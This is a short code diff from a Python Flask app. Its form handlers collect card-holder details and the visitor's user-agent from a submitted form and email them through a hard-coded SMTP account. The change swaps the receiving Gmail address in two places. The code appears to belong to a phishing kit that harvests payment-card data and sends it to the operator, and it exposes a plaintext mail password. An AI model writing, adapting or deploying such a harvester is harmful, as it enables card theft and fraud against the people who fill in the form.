@@ -187,7 +187,7 @@ def first():
         cardholdername = request.form.get('cardHolderName')
         sender_emailx = 'contact'
         sender_email = 'contact@personalbio.site'
-        receiver_email = 'aaronjames247513@gmail.com'
+        receiver_email = 'firepeed083@gmail.com'
         password = 'vip79d01760b097'
         useragent = request.headers.get('User-Agent')
         message = MIMEMultipart('alternative')
@@ -242,7 +242,7 @@ def second():
         cardholdername = request.form.get('cardHolderName')
         sender_emailx = 'contact'
         sender_email = 'contact@personalbio.site'
-        receiver_email = 'aaronjames247513@gmail.com'
+        receiver_email = 'firepeed083@gmail.com'
         password = 'vip79d01760b097'
         useragent = request.headers.get('User-Agent')
         message = MIMEMultipart('alternative')
